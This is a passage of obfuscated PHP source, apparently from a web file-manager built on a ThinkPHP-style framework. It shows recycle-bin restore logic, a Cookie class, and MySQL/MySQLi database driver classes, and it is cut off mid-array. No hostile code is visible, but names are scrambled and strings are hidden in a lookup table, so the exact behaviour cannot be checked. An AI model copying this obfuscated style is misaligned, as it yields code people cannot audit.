$´±ﬂè–Ö))->delete(); } foreach ($ëñ≠£∞¡ as $¡°ïÔ¨å) { $îÜÏ¸»ï->targetSpaceUpdate($¡°ïÔ¨å[$€⁄÷™à›[190]], $¡°ïÔ¨å[$€⁄÷™à›[577]]); } } public function restore($∂•ÏÚ∫˙ = false) { $é—˝ïÿ“ = $this->listData(); $this->_restoreSource($é—˝ïÿ“, $∂•ÏÚ∫˙); } public function removeUserAll($ –˚ÁÈØ) { $this->remove(!1, $ –˚ÁÈØ); } public function restoreItem($Éµ˝¢¢“) { $this->_restoreSource(array($Éµ˝¢¢“), array($Éµ˝¢¢“)); } private function _restoreSource($†¢Çíª∂, $”ûíªÉ“) { $ÆÍ¨ÈúΩ =& $_SERVER[ß⁄ˆÇ†Œ]; $„îˆÛÔÜ = Model($ÆÍ¨ÈúΩ[1414]); $”ûíªÉ“ = $”ûíªÉ“ == !1 ? !1 : $”ûíªÉ“; if (!$†¢Çíª∂) { return !0; } $ä™óúÔÅ = array(); foreach ($†¢Çíª∂ as $·ûí™ÿê) { if ($”ûíªÉ“ != !1 && !in_array($·ûí™ÿê, $”ûíªÉ“)) { continue; } $˙π”¸«À = $„îˆÛÔÜ->sourceInfo($·ûí™ÿê); $èöÍ‡Ÿ¸ = $„îˆÛÔÜ->sourceInfo($˙π”¸«À[$ÆÍ¨ÈúΩ[192]]); if ($èöÍ‡Ÿ¸[$ÆÍ¨ÈúΩ[513]] == $ÆÍ¨ÈúΩ[91]) { continue; } $„îˆÛÔÜ->lockMoveStart($·ûí™ÿê); $this->recycleMove($·ûí™ÿê, 0); if ($˙π”¸«À[$ÆÍ¨ÈúΩ[493]] == $ÆÍ¨ÈúΩ[91]) { $¸ñ⁄¯¯Ñ = array($ÆÍ¨ÈúΩ[660] => array($ÆÍ¨ÈúΩ[620], $˙π”¸«À[$ÆÍ¨ÈúΩ[592]] . $·ûí™ÿê . $ÆÍ¨ÈúΩ[621])); $„îˆÛÔÜ->where($¸ñ⁄¯¯Ñ)->setField($ÆÍ¨ÈúΩ[513], 0); $this->restoreFolderChildren($·ûí™ÿê, $†¢Çíª∂); } $this->where(array($ÆÍ¨ÈúΩ[193] => $·ûí™ÿê))->delete(); $„îˆÛÔÜ->folderSizeReset($˙π”¸«À[$ÆÍ¨ÈúΩ[192]]); $ä™óúÔÅ[] = $˙π”¸«À[$ÆÍ¨ÈúΩ[192]]; if ($˙π”¸«À[$ÆÍ¨ÈúΩ[493]] == $ÆÍ¨ÈúΩ[91]) { $ä™óúÔÅ[] = $·ûí™ÿê; } $„îˆÛÔÜ->lockMoveEnd($·ûí™ÿê); } $„îˆÛÔÜ->updateModifyTime($ä™óúÔÅ); } private function restoreFolderChildren($±…Ïº˝ª, $¿ßÚû‹˛) { $·§Ã¢ÎÜ =& $_SERVER[ß⁄ˆÇ†Œ]; $µﬂ£ﬁ≥Õ = Model($·§Ã¢ÎÜ[1414]); $≠ı‰ˆÖÓ = array($·§Ã¢ÎÜ[193] => array($·§Ã¢ÎÜ[7], array())); foreach ($¿ßÚû‹˛ as $ﬂØÏ”⁄Ò) { if ($ﬂØÏ”⁄Ò == $±…Ïº˝ª) { continue; } if (!$µﬂ£ﬁ≥Õ->isParentOf($±…Ïº˝ª, $ﬂØÏ”⁄Ò)) { continue; } $“ª´˙∫Î = $µﬂ£ﬁ≥Õ->sourceInfo($ﬂØÏ”⁄Ò); if ($“ª´˙∫Î[$·§Ã¢ÎÜ[493]] == $·§Ã¢ÎÜ[91]) { $≠ı‰ˆÖÓ[] = array($·§Ã¢ÎÜ[660] => array($·§Ã¢ÎÜ[620], $“ª´˙∫Î[$·§Ã¢ÎÜ[592]] . $ﬂØÏ”⁄Ò . $·§Ã¢ÎÜ[621])); } else { $≠ı‰ˆÖÓ[$·§Ã¢ÎÜ[193]][1][] = $ﬂØÏ”⁄Ò; } } if (!$≠ı‰ˆÖÓ[$·§Ã¢ÎÜ[193]][1]) { unset($≠ı‰ˆÖÓ[$·§Ã¢ÎÜ[193]]); } if (!$≠ı‰ˆÖÓ) { return; } if (is_array($≠ı‰ˆÖÓ[$·§Ã¢ÎÜ[193]]) && is_array($≠ı‰ˆÖÓ[$·§Ã¢ÎÜ[193]][1])) { $≠ı‰ˆÖÓ[$·§Ã¢ÎÜ[193]][1] = array_unique($≠ı‰ˆÖÓ[$·§Ã¢ÎÜ[193]][1]); } $≠ı‰ˆÖÓ[$·§Ã¢ÎÜ[1074]] = $·§Ã¢ÎÜ[2065]; $µﬂ£ﬁ≥Õ->where($≠ı‰ˆÖÓ)->setField($·§Ã¢ÎÜ[513], 1); } private function recycleMove($û¢°À¡€, $Â“ú©≤° = 1) { $ÃñáÚµ» =& $_SERVER[ß⁄ˆÇ†Œ]; $ﬁÁ™Ë≤Ò = Model($ÃñáÚµ»[1414]); $ÌÍÊ¬ûø = Model($ÃñáÚµ»[2287]); $í§˘Ò§π = array($ÃñáÚµ»[193] => $û¢°À¡€); if ($Â“ú©≤°) { $ﬁÁ™Ë≤Ò->where($í§˘Ò§π)->setField($ÃñáÚµ»[513], 1); $ÌÍÊ¬ûø->eventRecycle($û¢°À¡€, $ÃñáÚµ»[2288]); } else { $›˝√≠÷ª = $ﬁÁ™Ë≤Ò->where($í§˘Ò§π)->find(); $êÒïŸΩç = $›˝√≠÷ª[$ÃñáÚµ»[493]] == $ÃñáÚµ»[91]; $á¥˜«à™ = $ﬁÁ™Ë≤Ò->fileNameAuto($›˝√≠÷ª[$ÃñáÚµ»[192]], $›˝√≠÷ª[$ÃñáÚµ»[32]], REPEAT_RENAME_FOLDER, $êÒïŸΩç); if ($á¥˜«à™ != $›˝√≠÷ª[$ÃñáÚµ»[32]]) { $ﬁÁ™Ë≤Ò->rename($û¢°À¡€, $á¥˜«à™); } $ﬁÁ™Ë≤Ò->where($í§˘Ò§π)->setField($ÃñáÚµ»[513], 0); $ÌÍÊ¬ûø->eventRecycle($û¢°À¡€, $ÃñáÚµ»[2289]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\x73\x6f\x75\x72\143\x65\123\x65\x63\x72\145\164\x4c\x69\x73\164"; public $field = array("\x73\x6f\165\162\143\x65\111\x44", "\x74\171\160\x65\111\104", "\143\x72\x65\141\x74\145\x55\163\145\x72"); } goto Cœôê∆ıòÌ; b¶úå∞∞Ò‰: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($öÕîƒŒ = '', $—¶ìÁ˚— = 0) { if (is_string($öÕîƒŒ) && $öÕîƒŒ != $_SERVER[ß⁄ˆÇ†Œ][12]) { $this->prefix = $öÕîƒŒ; } if (is_numeric($—¶ìÁ˚—) && $—¶ìÁ˚— > 0) { $this->expire = $—¶ìÁ˚—; } } public static function getInstance() { static $öÜ‹÷°Ü; if ($öÜ‹÷°Ü === null) { $öÜ‹÷°Ü = new self(); } return $öÜ‹÷°Ü; } private static $cookieDisable = false; public static function disable($…éÕ‰ñ⁄) { self::$cookieDisable = $…éÕ‰ñ⁄; } private static $sameCookieSet = array(); public static function set($¡™–¢Ø®, $™Èæ≥ü, $ÏÇ¡î™— = 0, $‚…≤ ÉÄ = false, $“Œº‘Ü› = false) { $€Ÿı√√∏ =& $_SERVER[ß⁄ˆÇ†Œ]; if (self::$cookieDisable) { return; } if (!$ÏÇ¡î™—) { $ÏÇ¡î™— = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$¡™–¢Ø®]) && self::$sameCookieSet[$¡™–¢Ø®] == $™Èæ≥ü . $ÏÇ¡î™—) { return; } self::$sameCookieSet[$¡™–¢Ø®] = $™Èæ≥ü . $ÏÇ¡î™—; if (!$“Œº‘Ü›) { $“Œº‘Ü› = str_replace(HOST, $€Ÿı√√∏[12], APP_HOST); $“Œº‘Ü› = _get($GLOBALS, $€Ÿı√√∏[956], $“Œº‘Ü›); } $ÃØÇ·À« = $€Ÿı√√∏[12]; setcookie($¡™–¢Ø®, $™Èæ≥ü, time() + $ÏÇ¡î™—, $€Ÿı√√∏[8] . trim($“Œº‘Ü›, $€Ÿı√√∏[8]) . $ÃØÇ·À«, !1, !1, $‚…≤ ÉÄ); } public static function setSafe($ôÇØó¡à, $œìî´ ò, $ò¶’ΩÄ’ = 0) { self::set($ôÇØó¡à, $œìî´ ò, $ò¶’ΩÄ’, !0); } public static function get($ÅÒ»”≠é) { static $ÏÊÏñƒ = false; if (!$ÏÊÏñƒ) { self::initHeaderCookie(); $ÏÊÏñƒ = !0; } return isset($_COOKIE[$ÅÒ»”≠é]) ? $_COOKIE[$ÅÒ»”≠é] : !1; } private static function initHeaderCookie() { $øó≤—ô° =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($_SERVER[$øó≤—ô°[957]]) || !$_SERVER[$øó≤—ô°[957]]) { return; } $±åœÃ¡¡ = explode($øó≤—ô°[74], $_SERVER[$øó≤—ô°[957]]); foreach ($±åœÃ¡¡ as $áπ”≠≠õ) { $áπ”≠≠õ = explode($øó≤—ô°[958], $áπ”≠≠õ); if (count($áπ”≠≠õ) != 2 || !isset($áπ”≠≠õ[1])) { continue; } $_COOKIE[trim($áπ”≠≠õ[0])] = trim($áπ”≠≠õ[1]); } } public static function remove($ÂõŒÄÛµ, $ŒßçÏ¯¸ = false) { unset($_COOKIE[$ÂõŒÄÛµ]); self::set($ÂõŒÄÛµ, $_SERVER[ß⁄ˆÇ†Œ][12], 1, $ŒßçÏ¯¸); } } class DbMysql extends Db { public function __construct($öãÜ∆∫Õ = '') { $˚‘˜ÌœÇ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!extension_loaded($˚‘˜ÌœÇ[877])) { think_exception(think_lang($˚‘˜ÌœÇ[14]) . $˚‘˜ÌœÇ[959]); } if (!empty($öãÜ∆∫Õ)) { $this->config = $öãÜ∆∫Õ; if (empty($this->config[$˚‘˜ÌœÇ[17]])) { $this->config[$˚‘˜ÌœÇ[17]] = $˚‘˜ÌœÇ[12]; } } } public function connect($∞Øúìù“ = '', $Ø´÷≥ﬁª = 0, $À≈ùˆç∫ = false) { $•¡∏ú‚ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($this->linkID[$Ø´÷≥ﬁª])) { if (empty($∞Øúìù“)) { $∞Øúìù“ = $this->config; } $À¸¥úË¯ = $∞Øúìù“[$•¡∏ú‚[960]] . ($∞Øúìù“[$•¡∏ú‚[961]] ? "\x3a{$∞Øúìù“[$•¡∏ú‚[961]]}" : $•¡∏ú‚[12]); $ØñõÑÄﬁ = !empty($∞Øúìù“[$•¡∏ú‚[17]][$•¡∏ú‚[18]]) ? $∞Øúìù“[$•¡∏ú‚[17]][$•¡∏ú‚[18]] : $this->pconnect; if ($ØñõÑÄﬁ) { $this->linkID[$Ø´÷≥ﬁª] = mysql_pconnect($À¸¥úË¯, $∞Øúìù“[$•¡∏ú‚[962]], $∞Øúìù“[$•¡∏ú‚[963]], 131072); } else { $this->linkID[$Ø´÷≥ﬁª] = mysql_connect($À¸¥úË¯, $∞Øúìù“[$•¡∏ú‚[962]], $∞Øúìù“[$•¡∏ú‚[963]], !0, 131072); } if (!$this->linkID[$Ø´÷≥ﬁª] || !empty($∞Øúìù“[$•¡∏ú‚[21]]) && !mysql_select_db($∞Øúìù“[$•¡∏ú‚[21]], $this->linkID[$Ø´÷≥ﬁª])) { think_exception(mysql_error()); } $‡‘Îƒ∫á = mysql_get_server_info($this->linkID[$Ø´÷≥ﬁª]); mysql_query($•¡∏ú‚[964] . think_config($•¡∏ú‚[965]) . $•¡∏ú‚[58], $this->linkID[$Ø´÷≥ﬁª]); if ($‡‘Îƒ∫á > $•¡∏ú‚[966]) { mysql_query($•¡∏ú‚[967], $this->linkID[$Ø´÷≥ﬁª]); } $this->connected = !0; if (1 != think_config($•¡∏ú‚[22])) { unset($this->config); } } return $this->linkID[$Ø´÷≥ﬁª]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÌÎÂú«Ç) { $≠¯øéìú =& $_SERVER[ß⁄ˆÇ†Œ]; if (0 === stripos($ÌÎÂú«Ç, $≠¯øéìú[350])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÌÎÂú«Ç; if ($this->queryID) { $this->free(); } think_action_status($≠¯øéìú[23], 1); think_status($≠¯øéìú[24]); $this->queryID = mysql_query($ÌÎÂú«Ç, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($·Ò±˜πÍ) { $ÕÉë≤“¡ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $·Ò±˜πÍ; if ($this->queryID) { $this->free(); } think_action_status($ÕÉë≤“¡[25], 1); think_status($ÕÉë≤“¡[24]); $˝¯¥Üéª = mysql_query($·Ò±˜πÍ, $this->_linkID); $this->debug(); if (!1 === $˝¯¥Üéª) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ß⁄ˆÇ†Œ][968], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $˘˚¨Ì¢∑ = mysql_query($_SERVER[ß⁄ˆÇ†Œ][969], $this->_linkID); $this->transTimes = 0; if (!$˘˚¨Ì¢∑) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $∏˜º´∫≤ = mysql_query($_SERVER[ß⁄ˆÇ†Œ][970], $this->_linkID); $this->transTimes = 0; if (!$∏˜º´∫≤) { $this->error(); return !1; } } return !0; } private function getAll() { $°èÙê›û = array(); if ($this->numRows > 0) { while ($Áú€¬ª‡ = mysql_fetch_assoc($this->queryID)) { $°èÙê›û[] = $Áú€¬ª‡; } mysql_data_seek($this->queryID, 0); } return $°èÙê›û; } public function getFields($êï˝≠ à) { $π≤›ïÚª =& $_SERVER[ß⁄ˆÇ†Œ]; $ü˘Îï‚Ê = $this->query($π≤›ïÚª[971] . $this->parseKey($êï˝≠ à)); $ÅªïÖ÷° = array(); if ($ü˘Îï‚Ê) { foreach ($ü˘Îï‚Ê as $éÄ˙πﬁÉ => $∞ä◊¢åÅ) { $ÅªïÖ÷°[$∞ä◊¢åÅ[$π≤›ïÚª[31]]] = array($π≤›ïÚª[32] => $∞ä◊¢åÅ[$π≤›ïÚª[31]], $π≤›ïÚª[33] => $∞ä◊¢åÅ[$π≤›ïÚª[34]], $π≤›ïÚª[35] => (bool) (strtoupper($∞ä◊¢åÅ[$π≤›ïÚª[36]]) === $π≤›ïÚª[972]), $π≤›ïÚª[37] => $∞ä◊¢åÅ[$π≤›ïÚª[38]], $π≤›ïÚª[39] => strtolower($∞ä◊¢åÅ[$π≤›ïÚª[40]]) == $π≤›ïÚª[41], $π≤›ïÚª[42] => strtolower($∞ä◊¢åÅ[$π≤›ïÚª[43]]) == $π≤›ïÚª[44]); } } return $ÅªïÖ÷°; } public function getTables($’É√î–† = '') { $—øÚáº¡ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!empty($’É√î–†)) { $Â¿Ü≥◊” = $—øÚáº¡[973] . $’É√î–† . $—øÚáº¡[974]; } else { $Â¿Ü≥◊” = $—øÚáº¡[975]; } $ËÍïπﬂº = $this->query($Â¿Ü≥◊”); $ÌôåëÇ¿ = array(); foreach ($ËÍïπﬂº as $ ãöçæ¯ => $í˙®ñÕ·) { $ÌôåëÇ¿[$ ãöçæ¯] = current($í˙®ñÕ·); } return $ÌôåëÇ¿; } public function replace($Á™∫ÍÓÖ, $ÂÈñ‘ñá = array()) { $á»íŸ»√ =& $_SERVER[ß⁄ˆÇ†Œ]; foreach ($Á™∫ÍÓÖ as $òé€ä´ı => $ªÜÓÅ∫õ) { $Ö„Ùı˚ = $this->parseValue($ªÜÓÅ∫õ); if (is_scalar($Ö„Ùı˚)) { $Õêê’Î®[] = $Ö„Ùı˚; $≈ÇïÅô≤[] = $this->parseKey($òé€ä´ı); } } $‡òÂ√Ïü = $á»íŸ»√[976] . $this->parseTable($ÂÈñ‘ñá[$á»íŸ»√[365]]) . $á»íŸ»√[977] . implode($á»íŸ»√[50], $≈ÇïÅô≤) . $á»íŸ»√[978] . implode($á»íŸ»√[50], $Õêê’Î®) . $á»íŸ»√[979]; return $this->execute($‡òÂ√Ïü); } public function insertAll($õ´Ø•Í¨, $É‰Ø∆ŸÂ = array(), $∂ÙÒøÌ˝ = false) { $í˚âÑìó =& $_SERVER[ß⁄ˆÇ†Œ]; if (!is_array($õ´Ø•Í¨[0])) { return !1; } $‹˜˚¸ñê = array_keys($õ´Ø•Í¨[0]); $ã‹√ô‘Ê = array(); foreach ($õ´Ø•Í¨ as $˛ﬁﬁø⁄õ) { $‰¢ïöú• = array(); foreach ($˛ﬁﬁø⁄õ as $‡†öÉˆ‘ => $™éŸπ©ﬂ) { $™éŸπ©ﬂ = $this->parseValue($™éŸπ©ﬂ); if (is_scalar($™éŸπ©ﬂ)) { $‰¢ïöú•[] = $™éŸπ©ﬂ; } } $ã‹√ô‘Ê[] = $í˚âÑìó[346] . implode($í˚âÑìó[50], $‰¢ïöú•) . $í˚âÑìó[979]; } array_walk($‹˜˚¸ñê, array($this, $í˚âÑìó[980])); $îîäñÕ = ($∂ÙÒøÌ˝ ? $í˚âÑìó[981] : $í˚âÑìó[982]) . $í˚âÑìó[983] . $this->parseTable($É‰Ø∆ŸÂ[$í˚âÑìó[365]]) . $í˚âÑìó[977] . implode($í˚âÑìó[50], $‹˜˚¸ñê) . $í˚âÑìó[984] . implode($í˚âÑìó[50], $ã‹√ô‘Ê); return $this->execute($îîäñÕ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ß⁄Ö§à⁄ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->error = mysql_errno() . $ß⁄Ö§à⁄[4] . mysql_error($this->_linkID); if ($ß⁄Ö§à⁄[12] != $this->queryStr) { $this->error .= LNG($ß⁄Ö§à⁄[48]) . $this->queryStr; } think_trace($this->error, $ß⁄Ö§à⁄[12], $ß⁄Ö§à⁄[49]); return $this->error; } public function escapeString($â†¡◊»±) { if ($this->_linkID) { return mysql_real_escape_string($â†¡◊»±, $this->_linkID); } else { return mysql_escape_string($â†¡◊»±); } } public function parseKey(&$Æ±∞ª«Ü, $∞ÔÂﬁè‡ = true) { $ïÉ€†—ƒ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($∞ÔÂﬁè‡) { $Æ±∞ª«Ü = $this->parseKeyCheck($Æ±∞ª«Ü); } if ($Æ±∞ª«Ü != $ïÉ€†—ƒ[220] && !preg_match($ïÉ€†—ƒ[985], $Æ±∞ª«Ü)) { $Æ±∞ª«Ü = $ïÉ€†—ƒ[469] . trim($Æ±∞ª«Ü, $ïÉ€†—ƒ[469]) . $ïÉ€†—ƒ[469]; } return $Æ±∞ª«Ü; } } class DbMysqli extends Db { public function __construct($∞ÅΩ„ë≥ = '') { $õƒÿÈΩÙ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!extension_loaded($õƒÿÈΩÙ[986])) { think_exception(think_lang($õƒÿÈΩÙ[14]) . $õƒÿÈΩÙ[987]); } if (!empty($∞ÅΩ„ë≥)) { $this->config = $∞ÅΩ„ë≥; if (empty($this->config[$õƒÿÈΩÙ[17]])) { $this->config[$õƒÿÈΩÙ[17]] = $õƒÿÈΩÙ[12]; } } } public function connect($∂ˆµêÉ§ = '', $›√Ó±ÿ± = 0) { $Î…•Ù¿Í =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($this->linkID[$›√Ó±ÿ±])) { if (empty($∂ˆµêÉ§)) { $∂ˆµêÉ§ = $this->config; } $this->linkID[$›√Ó±ÿ±] = new mysqli($∂ˆµêÉ§[$Î…•Ù¿Í[960]], $∂ˆµêÉ§[$Î…•Ù¿Í[962]], $∂ˆµêÉ§[$Î…•Ù¿Í[963]], $∂ˆµêÉ§[$Î…•Ù¿Í[21]], $∂ˆµêÉ§[$Î…•Ù¿Í[961]] ? intval($∂ˆµêÉ§[$Î…•Ù¿Í[961]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $±Á∆ÅÂ• = $this->linkID[$›√Ó±ÿ±]->server_version; $this->linkID[$›√Ó±ÿ±]->query($Î…•Ù¿Í[964] . think_config($Î…•Ù¿Í[965]) . $Î…•Ù¿Í[58]); if ($±Á∆ÅÂ• > $Î…•Ù¿Í[966]) { $this->linkID[$›√Ó±ÿ±]->query($Î…•Ù¿Í[967]); } $this->connected = !0; if (1 != think_config($Î…•Ù¿Í[22])) { unset($this->config); } } return $this->linkID[$›√Ó±ÿ±]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ÌåïÚ≥∏) { $‘∞å¥ƒŒ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÌåïÚ≥∏; if ($this->queryID) { $this->free(); } think_action_status($‘∞å¥ƒŒ[23], 1); think_status($‘∞å¥ƒŒ[24]); $this->queryID = $this->_linkID->query($ÌåïÚ≥∏); if ($this->_linkID->more_results()) { while (($˛¥çÀ≠∆ = $this->_linkID->next_result()) != NULL) { $˛¥çÀ≠∆->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($£ƒÜÍè∆) { $ëíÄ¸∫ë =& $_SERVER[ß⁄ˆÇ†Œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $£ƒÜÍè∆; if ($this->queryID) { $this->free(); } think_action_status($ëíÄ¸∫ë[25], 1); think_status($ëíÄ¸∫ë[24]); $Ω°∞¶üü = $this->_linkID->query($£ƒÜÍè∆); $this->debug(); if (!1 === $Ω°∞¶üü) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Íı˘ÅìÎ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Íı˘ÅìÎ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ºﬁ§ê°≈ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ºﬁ§ê°≈) { $this->error(); return !1; } } return !0; } private function getAll() { $ô”ºÑ“ﬁ = array(); if ($this->numRows > 0) { for ($ñÓºƒéª = 0; $ñÓºƒéª < $this->numRows; $ñÓºƒéª++) { $ô”ºÑ“ﬁ[$ñÓºƒéª] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ô”ºÑ“ﬁ; } public function getFields($ËÙ“ ¿») { $ÌÑ¢–Ó∑ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ø±ó≤ΩÏ = $this->query($ÌÑ¢–Ó∑[971] . $this->parseKey($ËÙ“ ¿»)); $Ï¯Ë÷√¯ = array(); if ($Ø±ó≤ΩÏ) { foreach ($Ø±ó≤ΩÏ as $√îÙÙÎ„ => $ñªÿ„îÛ) { $Ï¯Ë÷√¯[$ñªÿ„îÛ[$ÌÑ¢–Ó∑[31]]] = array($ÌÑ¢–Ó∑[32] => $ñªÿ„îÛ[$ÌÑ¢–Ó∑[31]], $ÌÑ¢–Ó∑[33] => $ñªÿ„îÛ[$ÌÑ¢–Ó∑[34]], $ÌÑ¢–Ó∑[35] => (bool) ($ñªÿ„îÛ[$ÌÑ¢–Ó∑[36]] === $ÌÑ¢–Ó∑[12]), $ÌÑ¢–Ó∑[37] => $ñªÿ„îÛ[$ÌÑ¢–Ó∑[38]], $ÌÑ¢–Ó∑[39] => strtolower($ñªÿ„îÛ[$ÌÑ¢–Ó∑[40]]) == $ÌÑ¢–Ó∑[41], $ÌÑ¢–Ó∑[42] => strtolower($ñªÿ„îÛ[$ÌÑ¢–Ó∑[43]]) == $ÌÑ¢–Ó∑[44]); } } return $Ï¯Ë÷√¯; } public function getTables($’Ó„ÕÆ‚ = '') { $˝ŒÑŸÜ⁄ =& $_SERVER[ß⁄ˆÇ†Œ]; $¨¨ÔÕ¡° = !empty($’Ó„ÕÆ‚) ? $˝ŒÑŸÜ⁄[973] . $’Ó„ÕÆ‚ . $˝ŒÑŸÜ⁄[974] : $˝ŒÑŸÜ⁄[975]; $Ó£¯Ñ¡∞ = $this->query($¨¨ÔÕ¡°); $©Òì›‘µ = array(); if ($Ó£¯Ñ¡∞) { foreach ($Ó£¯Ñ¡∞ as $˛ƒæÊç⁄ => $€«ı≈±€) { $©Òì›‘µ[$˛ƒæÊç⁄] = current($€«ı≈±€); } } return $©Òì›‘µ; } public function replace($âœÇäê“, $¥ıé· ≈ = array()) { $Ä¯Ó…˝Û =& $_SERVER[ß⁄ˆÇ†Œ]; foreach ($âœÇäê“ as $ñ∏ÅÈΩ÷ => $‡éØŒ˘Â) { $ûçÛ”ó∑ = $this->parseValue($‡éØŒ˘Â); if (is_scalar($ûçÛ”ó∑)) { $˛˛ÏÔ∏°[] = $ûçÛ”ó∑; $é™®Öìí[] = $this->parseKey($ñ∏ÅÈΩ÷); } } $å“çßˆÁ = $Ä¯Ó…˝Û[976] . $this->parseTable($¥ıé· ≈[$Ä¯Ó…˝Û[365]]) . $Ä¯Ó…˝Û[977] . implode($Ä¯Ó…˝Û[50], $é™®Öìí) . $Ä¯Ó…˝Û[978] . implode($Ä¯Ó…˝Û[50], $˛˛ÏÔ∏°) . $Ä¯Ó…˝Û[979]; return $this->execute($å“çßˆÁ); } public function insertAll($πîÙÊèÏ, $˘ï◊©√õ = array(), $ç¡˝òÂ— = false) { $Æ∑∑†ÔÒ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!is_array($πîÙÊèÏ[0])) { return !1; } $˘©Õ”†¯ = array_keys($πîÙÊèÏ[0]); $Ì÷öƒóﬁ = array(); foreach ($πîÙÊèÏ as $»óº°ÍÏ) { $◊∫ï»¯Ë = array(); foreach ($»óº°ÍÏ as $∏˙àÀ°º => $‹£Ü ä·) { $‹£Ü ä· = $this->parseValue($‹£Ü ä·); if (is_scalar($‹£Ü ä·)) { $◊∫ï»¯Ë[] = $‹£Ü ä·; } } $Ì÷öƒóﬁ[] = $Æ∑∑†ÔÒ[346] . implode($Æ∑∑†ÔÒ[50], $◊∫ï»¯Ë) . $Æ∑∑†ÔÒ[979]; } array_walk($˘©Õ”†¯, array($this, $Æ∑∑†ÔÒ[980])); $·–µÁﬁ˛ = $ç¡˝òÂ— ? $Æ∑∑†ÔÒ[981] : $Æ∑∑†ÔÒ[982]; $û¥ƒçÉ∂ = $·–µÁﬁ˛ . $Æ∑∑†ÔÒ[983] . $this->parseTable($˘ï◊©√õ[$Æ∑∑†ÔÒ[365]]) . $Æ∑∑†ÔÒ[977] . implode($Æ∑∑†ÔÒ[50], $˘©Õ”†¯) . $Æ∑∑†ÔÒ[984] . implode($Æ∑∑†ÔÒ[50], $Ì÷öƒóﬁ); return $this->execute($û¥ƒçÉ∂); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $À◊πÄâ¿ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->error = $this->_linkID->errno . $À◊πÄâ¿[4] . $this->_linkID->error; if ($À◊πÄâ¿[12] != $this->queryStr) { $this->error .= LNG($À◊πÄâ¿[48]) . $this->queryStr; } think_trace($this->error, $À◊πÄâ¿[12], $À◊πÄâ¿[49]); return $this->error; } public function escapeString($‚ÜÚ†˛É) { if ($this->_linkID) { return $this->_linkID->real_escape_string($‚ÜÚ†˛É); } else { return addslashes($‚ÜÚ†˛É); } } public function parseKey(&$€ÜÍÅ∂ , $ñò≤—ﬁÇ = true) { $∫ïÀ€Íã =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ñò≤—ﬁÇ) { $€ÜÍÅ∂  = $this->parseKeyCheck($€ÜÍÅ∂ ); } if ($€ÜÍÅ∂  != $∫ïÀ€Íã[220] && !preg_match($∫ïÀ€Íã[985], $€ÜÍÅ∂ )) { $€ÜÍÅ∂  = $∫ïÀ€Íã[469] . trim($€ÜÍÅ∂ , $∫ïÀ€Íã[469]) . $∫ïÀ€Íã[469]; } return $€ÜÍÅ∂ ; } } goto c—ÌñÍª®œ; Bñãñç—È—: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\161" => "\74\x3e", "\147\164" => "\76", "\145\147\164" => "\x3e\75", "\x6c\x74" => "\x3c", "\x65\154\x74" => "\74\x3d", "\156\x6f\x74\x6c\151\x6b\145" => "\x4e\117\x54\40\114\111\113\x45", "\154\x69\x6b\145" => "\x4c\111\113\105", "\151\x6e" => "\x49\116", "\x6e\x6f\164\151\156" => "\116\117\124\x20\111\x4e", "\156\157\164\40\151\156" => "\x4e\117\124\40\111\x4e", "\x62\x65\164\x77\x65\x65\156" => "\x42\x45\x54\127\105\x45\x4e", "\x6e\x6f\x74\142\145\x74\167\145\145\156" => 